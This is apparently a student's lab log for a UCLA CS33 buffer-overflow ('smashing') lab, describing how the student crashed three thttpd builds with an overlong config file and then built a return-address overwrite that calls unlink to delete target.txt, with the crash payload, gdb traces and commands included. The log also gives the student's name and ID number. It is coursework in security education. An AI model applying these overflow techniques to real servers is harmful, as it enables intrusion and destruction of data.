@@ -1,0 +1,174 @@
+Connor Kenny	304437322
+CS33	Smashinglab.txt
+
+This is my log for the Smashing Lab:
+
+I read the lab and looked at TA’s slides for guidance.
+
+My port numbers are:
+
+12618 12619 12620
+
+Followed his guide and got the tarball on to seasnet. Began compiling for NO because it is the easiest.
+
+Really starting to get adjusted to linux and the terminal commands. 
+Compiled all three of the versions using the help of piazza and the TA’s guide. 
+Done exactly the same as the lab spec, but after reading and trying a lot of different combinations, it is all starting to make sense.
+
+Now have everything set up to begin the bulk of the lab. Let’s see how this goes…
+
+After about an hour of trying to get any of the versions to crash, sp finally does. Unfortunately, the backtrace is empty as gdb prints out “No stack”
+
+Tried running it under gdb and got a backtrace, but am trying to figure out why it didn’t work in the first place.
+
+Trying different combinations for the config file. I have tried random junk, but it detected that there wasn’t a real config file. 
+Then I started to use one of the options at the beginning of the file, specifically ‘max_age’ and set it to something. 
+Then I used a ‘#’ to denote a comment. 
+All of the 1’s and 0’s that follow are there to make it too long so that the program would crash.
+
+I decided to just put an abundance of characters in the config file to try to wipe out everything with the buffer overflow. 
+It worked perfectly. All three versions crashed with this single config file. Here it is:
+
+max_age=1000#
+10101010101001010101010101010101010110100101010101011010100101010101011010
+10101010100101011010101010101010101001010101010101010101010110100101010101
+01101010010101010101101010101010100101011010101010101010101001010101010101
+01010101011010010101010101101010010101010101101010101010100101011010101010
+10101010100101010101010101010101011010010101010101101010010101010101101010
+10101010010101101010101010101010100101010101010101010101011010010101010101
+10101001010101010110101010101010010101101010101010101010100101010101010101
+01010101101001010101010110101001010101010110101010101010010101101010101010
+10101010010101010101010101010101101001010101010110101001010101010110101010
+10101001010110101010101010101010010101010101010101010101101001010101010110
+10100101010101011010101010101001010110101010101010101010010101010101010101
+01010110100101010101011010100101010101011010101010101001010110101010101010
+10101001010101010101010101010110100101010101011010100101010101011010101010
+101001010110101010101011
+
+(I put new lines to fix the 200 column problem)
+
+There is more information about these 3 crashes in the Answers.txt file, including the backtraces and what instructions made the programs crash.
+
+Now I am on to question 8, which requires me to look at assembly code. I compiled them according to the spec and began to read them, but it was too jumbled.
+ I looked on piazza and found that there was a specific option (-fno-asynchronous-unwind-tables) that could clean it up. I ran that and now everything looks nice.
+
+After skimming through the three files, the SP and NO variants are essentially the same, while the AS variant is very different. 
+I am trying to read through all the assembly to understand generally what handle_read is supposed to do. 
+I looked at the thttpd.c file to get a general feeling of what it is supposed to do and have begun to compare them more in depth.
+
+After comparing each of the versions for a long time, I realized that AS does basically the same thing as the other two, except it also does many other checks for memory accesses. 
+
+Wrote a c program that uses unlink to delete the target file:
+
+int main()
+{
+        unlink("target.txt");
+        return 0;
+}
+
+Disassembled, this is the line that calls unlink@plt:
+
+0x08048435 <main+25>:	e8 9e fe ff ff	call   0x80482d8 <unlink@plt>
+
+Here are the unlink lines:
+
+0x00a51d20 in unlink () from /lib/libc.so.6
+=> 0x00a51d20 <unlink+0>:	89 da	mov    %ebx,%edx
+(gdb) ni
+0x00a51d22 in unlink () from /lib/libc.so.6
+=> 0x00a51d22 <unlink+2>:	8b 5c 24 04	mov    0x4(%esp),%ebx
+(gdb) ni
+0x00a51d26 in unlink () from /lib/libc.so.6
+=> 0x00a51d26 <unlink+6>:	b8 0a 00 00 00	mov    $0xa,%eax
+(gdb) ni
+0x00a51d2b in unlink () from /lib/libc.so.6
+=> 0x00a51d2b <unlink+11>:	65 ff 15 10 00 00 00	call   *%gs:0x10
+(gdb) ni
+0x00a51d32 in unlink () from /lib/libc.so.6
+=> 0x00a51d32 <unlink+18>:	89 d3	mov    %edx,%ebx
+(gdb) ni
+0x00a51d34 in unlink () from /lib/libc.so.6
+=> 0x00a51d34 <unlink+20>:	3d 01 f0 ff ff	cmp    $0xfffff001,%eax
+(gdb) ni
+0x00a51d39 in unlink () from /lib/libc.so.6
+=> 0x00a51d39 <unlink+25>:	73 01	jae    0xa51d3c <unlink+28>
+(gdb) ni
+0x00a51d3c in unlink () from /lib/libc.so.6
+=> 0x00a51d3c <unlink+28>:	e8 07 13 05 00	call   0xaa3048 <__i686.get_pc_thunk.cx>
+(gdb) ni
+0x00a51d41 in unlink () from /lib/libc.so.6
+=> 0x00a51d41 <unlink+33>:	81 c1 b3 f2 0b 00	add    $0xbf2b3,%ecx
+(gdb) ni
+0x00a51d47 in unlink () from /lib/libc.so.6
+=> 0x00a51d47 <unlink+39>:	8b 89 d8 ff ff ff	mov    -0x28(%ecx),%ecx
+(gdb) ni
+0x00a51d4d in unlink () from /lib/libc.so.6
+=> 0x00a51d4d <unlink+45>:	31 d2	xor    %edx,%edx
+(gdb) ni
+0x00a51d4f in unlink () from /lib/libc.so.6
+=> 0x00a51d4f <unlink+47>:	29 c2	sub    %eax,%edx
+(gdb) ni
+0x00a51d51 in unlink () from /lib/libc.so.6
+=> 0x00a51d51 <unlink+49>:	65 89 11	mov    %edx,%gs:(%ecx)
+(gdb) ni
+0x00a51d54 in unlink () from /lib/libc.so.6
+=> 0x00a51d54 <unlink+52>:	83 c8 ff	or     $0xffffffff,%eax
+(gdb) ni
+0x00a51d57 in unlink () from /lib/libc.so.6
+=> 0x00a51d57 <unlink+55>:	eb e2	jmp    0xa51d3b <unlink+27>
+(gdb) ni
+0x00a51d3b in unlink () from /lib/libc.so.6
+=> 0x00a51d3b <unlink+27>:	c3	ret  
+
+
+I have tried using hex2raw to convert the hexadecimal values to ascii, but they do not convert correctly. 
+I tried for the first time to delete the file using my exploit… Received a Segmentation fault.
+
+I got help from TA during office hours. I found where the return address was in terms of my config file. 
+This let me override it with the address of unlink (I didn’t need the unlink assembly any more). 
+This is “0x292d20” for server 2, so that is the server that my exploit will work on. 
+I overrode it by making my config file hold 8 0’s, 8 1’s etc. and then I found where it tried to return to. 
+Once I found this out, I could put the ASCII values of my address in that location (making sure it is backwards to account for little endianness). 
+Now the thttpd-no program goes to unlink after it “returns” from read_config. Now I have to try to get the parameter correct. 
+I need to find a way to use a NOP sled to get the argument to be target.txt. 
+I am assuming that there is no stack randomization and that it is on server 2. 
+Any other server will cause a crash.
+
+FINALLY, my exploit works. It actually does not use a NOP sled, but just uses a pointer straight to “target.txt” inside my config file. 
+This lets me pass it as an argument right away. The assumption that I made was that stack randomization was disabled (I ran it on GDB). 
+It will delete the target.txt and then crash. A more in depth description is in the answers.txt file.
+
+To get all of this to work, I mainly used the following commands (in no particular order):
+
+./src/thttpd-no -p 12620 -D -C exploit.txt
+echo [hex] | ./hex2raw >> exploit.txt
+cat [txt file with hex] | ./hex2raw > raw.txt
+touch target.txt
+gdb ./src/thttpd-no -p 12620
+(INSIDE GDB)
+run -C exploit.txt
+x/s $ebx
+x/48xw $esp
+ni
+si
+info reg
+set disassemble-next-line on
+b 1190
+
+It took a lot of trial and error along with a lot of internet/piazza searches to complete this exploit. 
+I had a really hard time getting the characters that nano text editor wouldn’t display to work correctly. 
+If I tried to copy and paste them, it would only copy the symbol instead of the value hidden by the garbage ASCII character. 
+Finally I realized that I could complete the exploit by using echo to send the hex2raw conversions directly to the file and then write my config file around those values. 
+Another obstacle I had was not really understanding how to go about the project. 
+I spent a long time trying to read and understand how you even begin to write an exploit such as this. 
+Now that I understand the process, I believe that writing another similar exploit would be much easier. 
+
+My solution does have to make one of the assumptions mentioned on Piazza. 
+I have thought long and hard for a solution that does not require stack randomization to be disabled, but I cannot find out how to get a relative address in my config file. 
+I believe that if I could figure that out, the solution would be fairly simple because you could just subtract the values I had from each other to get the relative value. 
+Overall, this was one of the most complicated, frustrating and interesting labs I’ve done here at UCLA, but I am very happy I was able to complete it.
+
+
+
+
+
